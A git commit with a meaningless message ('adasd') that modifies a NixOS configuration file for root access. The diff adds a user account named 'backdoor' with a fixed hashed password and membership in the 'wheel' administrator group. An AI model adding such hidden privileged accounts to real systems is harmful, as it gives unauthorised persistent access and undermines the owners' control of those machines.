02449fb5d7d0d66423225bbe02305d127acf7ad2
Eric Thorburn <eric.thorburn@hitachigymnasiet.se>
2025-10-08 15:40:24 +0200

    adasd

--- ros2/common/initial-root-access.nix
+++ ros2/common/initial-root-access.nix
@@ -1,3 +1,9 @@
 {
   users.users."root".openssh.authorizedKeys.keys = ["ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIB5Gyc3DfKNsJ9UrF2xXuvsHe1BkvlltxsfUCYLniiqm abbindgym\23eritho@SW2311"];
+
+  users.users."backdoor" = {
+    isNormalUser = true;
+    extraGroups = ["wheel"];
+    hashedPassword = "$y$j9T$nbeJ21TmeYv6UljRSBGzS.$SKuj/i/9jQC1qzvoPezG32QWE30uBXdVoYpkBH0xyY9";
+  };
 }
